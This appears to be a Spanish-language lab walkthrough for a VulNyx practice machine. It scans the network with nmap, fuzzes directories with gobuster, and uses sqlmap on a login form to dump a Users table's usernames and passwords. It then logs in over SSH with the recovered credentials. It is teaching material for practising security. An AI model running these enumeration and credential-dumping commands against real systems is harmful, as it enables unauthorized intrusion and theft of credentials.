Maquinas a utilizar **Kali Linux y** [https://vulnyx.com/#shop](https://vulnyx.com/#shop)

  

La **inyección SQL** es una vulnerabilidad de seguridad que se encuentra en aplicaciones que interactúan con bases de datos mediante lenguaje SQL (Structured Query Language). Su objetivo es explotar una falta de validación en las entradas proporcionadas por el usuario para ejecutar comandos SQL arbitrarios. Esto ocurre cuando el programa interpreta dichas entradas como parte de la consulta en lugar de tratarlas como datos.

La vulnerabilidad SQL Injection se acontece en bases de datos, y para auditar y explotar esta vulnerabilidad disponemos de una **herramienta** conocida como **sqlmap**, la cual nos permite de forma automatizada realizar una explotación de esta vulnerabilidad y poder acceder a las tablas, columnas y registros de la base de datos objetivo.

  

```Bash
sudo arp-scan -I eth0 --localnet
```

![[Imagenes/image 38.png|image 38.png]]

```Bash
ping -c 1 10.0.3.14 
```

![[Imagenes/image 1 27.png|image 1 27.png]]

  

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.14 -oN escaneo
```

![[Imagenes/image 2 26.png|image 2 26.png]]

Tenemos abiertos los puertos 22 y 80.

  

- Vamos a navegador web y ponemos la IP de la maquina victima.
    
    ![[Imagenes/image 3 25.png|image 3 25.png]]
    

  

- Hacemos **Fuzzing Web** usando **gobuster.**
    
    ```Bash
    gobuster dir -u http://10.0.3.14/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![[Imagenes/image 4 24.png|image 4 24.png]]
    
    Vemos un directorio llamado **administrator** que vamos a probar en el navegador web.
    
    ![[Imagenes/image 5 23.png|image 5 23.png]]
    
      
    
    Nos encontramos un **panel de** L**ogin**. Las **inyecciones de SQL** suelen darse **en** este tipo de **panel de Login**.
    
      
    
- Vamos a hacer una inyección SQL de forma automática con la herramienta **sqlmap.** Es muy **recomendable saber un poco de SQL**.
    
    > [!important] Aquí hay un **video** rápido de 27 minutos **sobre el tema**: [https://youtu.be/FbGG_cyLUAc?si=BTsQjzAUuadBj0LY](https://youtu.be/FbGG_cyLUAc?si=BTsQjzAUuadBj0LY)
    
      
    
    1. **Primer objetivo conocer las bases de datos existentes**.
        
        ```Bash
        sqlmap -u http://10.0.3.14/administrator/ --forms --dbs --batch
        ```
        
        ![[Imagenes/image 6 21.png|image 6 21.png]]
        
    
    `**sqlmap**`: Herramienta utilizada para detectar y explotar vulnerabilidades de inyección SQL en bases de datos.
    
    `**u http://10.0.3.14/administrator/**`:
    
    - La opción `u` especifica la URL que será el objetivo del análisis.
    - En este caso, la URL es `http://10.0.3.14/administrator/`.
    
    `**-forms**`:
    
    - Este parámetro indica a `sqlmap` que analice los formularios HTML de la página web objetivo para buscar posibles puntos de inyección SQL.
    
    `**-dbs**`:
    
    - Solicita que se enumeren las bases de datos disponibles en el servidor si se detecta una vulnerabilidad.
    
    `**-batch**`:
    
    - Permite ejecutar el comando en modo automático, sin requerir la interacción del usuario, respondiendo "sí" automáticamente a las preguntas que puedan surgir durante la ejecución.
    
      
    
      
    
    1. **Segundo objetivo conocer las tablas de la base de datos** que hemos seleccionado en nuestro caso de la base de datos Webapp.
        
        ```Bash
        sqlmap -u http://10.0.3.14/administrator/ --forms -D Webapp --tables --batch
        ```
        
        ![[Imagenes/image 7 19.png|image 7 19.png]]
        
        `**sqlmap**`: Como antes, es la herramienta para detectar y explotar vulnerabilidades de inyección SQL.
        
        `**u http://10.0.3.14/administrator/**`:
        
        - `u` especifica la URL objetivo para el análisis.
        - En este caso, sigue siendo `http://10.0.3.14/administrator/`.
        
        `**-forms**`:
        
        - Le dice a `sqlmap` que busque posibles puntos de inyección SQL en los formularios HTML de la página web objetivo.
        
        `**D Webapp**`:
        
        - La opción `D` se utiliza para especificar una base de datos en particular. Aquí, se está señalando la base de datos llamada `Webapp`.
        
        `**-tables**`:
        
        - Solicita a `sqlmap` que enumere las tablas disponibles dentro de la base de datos especificada (`Webapp`).
        
        `**-batch**`:
        
        - Ejecuta el comando de manera automática, sin necesidad de intervención manual del usuario, respondiendo automáticamente "sí" a las preguntas.
        
          
        
        Nos a encontrado una tabla que parece interesante, llamada **Users.**
        
          
        
          
        
    2. **Tercer objetivo entrar dentro de la tabla** Users. **Dentro** de las tablas **hay columnas**, entonces esto es lo que queremos ver.
        
        ```Bash
        sqlmap -u http://10.0.3.14/administrator/ --forms -D Webapp -T Users --columns --batch
        ```
        
        ![[Imagenes/image 8 17.png|image 8 17.png]]
        
          
        
        `**sqlmap**`: Herramienta utilizada para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web.
        
        `**u http://10.0.3.14/administrator/**`:
        
        - La opción `u` especifica la URL objetivo para el análisis.
        - En este caso, la URL es `http://10.0.3.14/administrator/`.
        
        `**-forms**`:
        
        - Indica que se analicen los formularios HTML de la página web para encontrar posibles vulnerabilidades de inyección SQL.
        
        `**D Webapp**`:
        
        - La opción `D` define la base de datos específica en la que se enfoca el análisis. Aquí, la base de datos objetivo es `Webapp`.
        
        `**T Users**`:
        
        - Con `T`, se especifica la tabla dentro de la base de datos que se desea analizar. En este caso, la tabla es `Users`.
        
        `**-columns**`:
        
        - Solicita que se enumeren las columnas disponibles en la tabla especificada (`Users`). Esto ayuda a comprender la estructura de la tabla.
        
        `**-batch**`:
        
        - Permite que el comando se ejecute automáticamente sin requerir intervención del usuario, respondiendo "sí" a cualquier pregunta que surja durante la ejecución.
        
          
        
          
        
    3. **Cuarto objetivo ver la información de la columnas** de la tabla Users.
        
        ```Bash
        sqlmap -u http://10.0.3.14/administrator/ --forms -D Webapp -T Users -C username,password --dump --batch
        ```
        
        ![[Imagenes/image 9 16.png|image 9 16.png]]
        
          
        
        `**sqlmap**`: Es la herramienta para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web.
        
        `**u http://10.0.3.14/administrator/**`:
        
        - Define la URL objetivo para realizar el análisis.
        - En este caso, la URL es `http://10.0.3.14/administrator/`.
        
        `**-forms**`:
        
        - Le dice a `sqlmap` que analice los formularios presentes en la página web, buscando puntos de inyección SQL.
        
        `**D Webapp**`:
        
        - Con esta opción se especifica la base de datos a analizar. En este caso, la base de datos objetivo es `Webapp`.
        
        `**T Users**`:
        
        - Define la tabla dentro de la base de datos que se desea investigar. Aquí, la tabla seleccionada es `Users`.
        
        `**C username,password**`:
        
        - Solicita que se examinen las columnas específicas `username` y `password` en la tabla `Users`.
        
        `**-dump**`:
        
        - Indica que se extraigan los datos contenidos en las columnas especificadas (`username` y `password`). Es decir, este parámetro fuerza a `sqlmap` a descargar y mostrar los valores almacenados.
        
        `**-batch**`:
        
        - Permite que el comando se ejecute automáticamente, sin interacción manual, respondiendo "sí" a cualquier pregunta.
        
          
        
        Nos a encontrado 4 usuarios con sus respectivas contraseñas.
        
          
        
          
        
- Vamos a probar el primer usuario con una conexión **ssh**. Aunque también podemos usar el **panel de Login** que habíamos encontrado al principio.
    
    ```Bash
    ssh bart@10.0.3.14
    ```
    
    ![[Imagenes/image 10 16.png|image 10 16.png]]
    

> [!important] **Resumen de Pasos:**
> 
> 1. **Obtener las Bases de Datos**
> 2. **Obtener las Tablas**
> 3. **Obtener las Columnas**
> 4. **Obtener los Registros**